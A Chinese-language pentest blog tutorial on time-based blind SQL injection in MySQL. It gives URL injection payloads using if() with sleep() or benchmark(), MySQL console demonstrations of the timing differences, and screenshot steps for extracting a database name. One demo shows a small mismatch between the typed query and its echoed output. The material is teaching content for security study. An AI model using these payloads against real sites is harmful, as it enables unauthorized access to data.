---
draft: false
date: 2016-06-24 10:10:27
title: SQL 注入之基于时间的注入(MySQL)
description: 基于时间的 SQL 注入
categories:
  - Pentest
tags:
  - SQL注入
---

### 0x00 特点
```
当页面存在注入，但是没有显示位且不管怎么测试返回页面都没有变化，此时可以使用基于时间的盲注进行注入。
其实只要存在SQL注入就可以使用基于时间的盲注，利用范围比较广泛，但是可能受到网络带宽等因素的影响。
```

### 0x01 利用方式
```
整型注入的话可以直接: ?id=if(1=1,sleep(2),1)
字符型的话需要闭合: ?id=2' and if(1=1,sleep(2),1) and '1
```

### 0x02 相关函数
* if(条件, 值1, 值2)  
当条件为真时返回值1，条件为假时返回值2

* sleep()  
sleep(2)睡眠两秒

* benchmark(count, expr)  
benchmark是用于测试函数性能的，它是将表达式expr执行count次，执行次数越多耗费时间越久

### 0x03 基于时间的注入payload
```
mysql> select if((select database()) like "rte%",sleep(2),666);
+---------------------------------------------------+
| if((select database()) like "rte%",sleep(2),666)  |
+---------------------------------------------------+
|                                                 0 |
+---------------------------------------------------+
1 row in set (2.00 sec)

mysql> select if((select database())="rteaaa",sleep(2),666);
+-----------------------------------------------+
| if((select database())="rtest1",sleep(2),666) |
+-----------------------------------------------+
|                                           666 |
+-----------------------------------------------+
1 row in set (0.00 sec)

mysql> select if((select database())="rtest",sleep(2),666);
+----------------------------------------------+
| if((select database())="rtest",sleep(2),666) |
+----------------------------------------------+
|                                            0 |
+----------------------------------------------+
1 row in set (2.00 sec)
```
```
mysql> select id,name,title from msg where id=if(1=1,benchmark(10000000,md5(11)),1);
Empty set (2.32 sec)

mysql> select id,name,title from msg where id=if(1=2,benchmark(10000000,md5(11)),1);
+----+-------+-------+
| id | name  | title |
+----+-------+-------+
|  1 | reber | first |
+----+-------+-------+
1 row in set (0.00 sec)
```

### 0x04 简单注入

1. 判断闭合字符(and 1=1／and 1=2)
![得到闭合字符](/img/post/sqli9-get-closed-character-1.png)
![得到闭合字符](/img/post/sqli9-get-closed-character-2.png)

2. 得到数据库名字
![得到数据库名字](/img/post/sqli9-get-database.png)
